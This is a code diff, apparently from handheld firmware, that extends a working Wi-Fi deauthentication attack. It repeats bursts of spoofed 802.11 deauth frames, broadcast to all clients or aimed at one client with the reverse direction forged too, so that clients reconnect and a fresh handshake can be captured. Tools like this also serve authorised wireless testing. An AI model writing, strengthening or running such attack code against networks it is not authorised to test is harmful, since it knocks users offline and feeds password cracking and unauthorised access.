@@ -555,6 +555,8 @@ int getCurrentRadioChannel() { return g_hopChannel.load(); }
 constexpr uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 constexpr int DEAUTH_BURST_COUNT = 12;
 constexpr int DEAUTH_FRAME_GAP_MS = 25;
+constexpr int DEAUTH_BLOCK_COUNT = 6;    // repeat the whole burst this many times, back to back
+constexpr int DEAUTH_BLOCK_GAP_MS = 200; // pause between blocks, so each one is a distinct burst
 
 /** Builds and sends one 802.11 deauthentication frame: addr1 = destination, addr2 = source
  * (the spoofed sender), addr3 = BSSID. Reason 7 ("class 3 frame from a non-associated
@@ -582,21 +584,29 @@ void sendDeauthFrame(const uint8_t* addr1, const uint8_t* addr2, const uint8_t* 
     }
 }
 
-/** A short, bounded deauth burst for one AP - not a continuous flood. Forces one reconnect
- * (useful to catch a fresh handshake), it does not keep clients off the network. Broadcasts
- * to every client when @a client is null; otherwise also spoofs the reverse (client -> AP)
- * direction, since a real client ignores a deauth that isn't addressed to it. */
+/** DEAUTH_BLOCK_COUNT bounded bursts for one AP, back to back - not a continuous flood. Forces
+ * one reconnect (useful to catch a fresh handshake), it does not keep clients off the network;
+ * repeating the burst in blocks only raises the odds one of them lands in the client's receive
+ * window, same reasoning aireplay-ng's own --deauth count applies. Broadcasts to every client
+ * when @a client is null; otherwise also spoofs the reverse (client -> AP) direction, since a
+ * real client ignores a deauth that isn't addressed to it. */
 void sendDeauthBurst(const uint8_t* bssid, const uint8_t* client) {
     const uint8_t* target = (client != nullptr) ? client : BROADCAST_MAC;
-    LOG_I(TAG, "deauth: sending %d frames to %02x:%02x:%02x:%02x:%02x:%02x for AP %02x:%02x:%02x:%02x:%02x:%02x",
-        DEAUTH_BURST_COUNT, target[0], target[1], target[2], target[3], target[4], target[5],
-        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
-    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
-        sendDeauthFrame(target, bssid, bssid);
-        if (client != nullptr) {
-            sendDeauthFrame(bssid, client, bssid);
+    for (int block = 0; block < DEAUTH_BLOCK_COUNT; block++) {
+        LOG_I(TAG, "deauth: block %d/%d, %d frames to %02x:%02x:%02x:%02x:%02x:%02x for AP %02x:%02x:%02x:%02x:%02x:%02x",
+            block + 1, DEAUTH_BLOCK_COUNT, DEAUTH_BURST_COUNT,
+            target[0], target[1], target[2], target[3], target[4], target[5],
+            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+        for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
+            sendDeauthFrame(target, bssid, bssid);
+            if (client != nullptr) {
+                sendDeauthFrame(bssid, client, bssid);
+            }
+            vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_GAP_MS));
         }
-        vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_GAP_MS));
+        if (block + 1 < DEAUTH_BLOCK_COUNT) {
+            vTaskDelay(pdMS_TO_TICKS(DEAUTH_BLOCK_GAP_MS));
+        }
     }
 }
 
@@ -2187,9 +2197,9 @@ int32_t appMain(int /*argc*/, char* /*argv*/[]) {
                             lvgl_unlock();
                         }
                         setCaptureLockChannel(channel);
-                        // Blocks this task briefly (waiting for the lock to actually take
-                        // effect, then the burst itself) - fine, it's this app's own dedicated
-                        // task, not the LVGL or timer task.
+                        // Blocks this task (waiting for the lock to actually take effect, then
+                        // the 6 burst blocks, a few seconds total) - fine, it's this app's own
+                        // dedicated task, not the LVGL or timer task.
                         sendDeauthBurstOnChannel(bssid, channel);
                         if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                             ctx.deauthBurstsSent++;
